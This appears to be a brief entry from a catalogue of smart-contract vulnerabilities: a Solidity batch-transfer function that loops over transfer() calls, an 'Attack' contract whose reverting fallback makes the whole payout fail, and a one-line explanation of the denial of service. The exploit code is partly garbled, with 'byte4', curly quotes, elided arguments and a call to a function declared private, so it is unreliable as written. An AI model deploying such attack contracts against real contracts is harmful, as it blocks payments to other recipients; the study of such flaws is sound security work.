## Vulnerable Code

```javascript
function realtransfer(address[] tos, uint[] values) private {

        for (uint i = 0; i < values.length; i++) {
            tos[i].transfer(values[i]);  //Vulnerable position 
        }
    }

```



## Exploit Code

```javascript
contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“realtransfer(address[], uint[])”)), ..., ...);
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Now let's look at the position of "//Vulnerable position", as we all know 'transfer' can revert transaction if failed.so if one of 'tos' element is failed then other address will be affect.
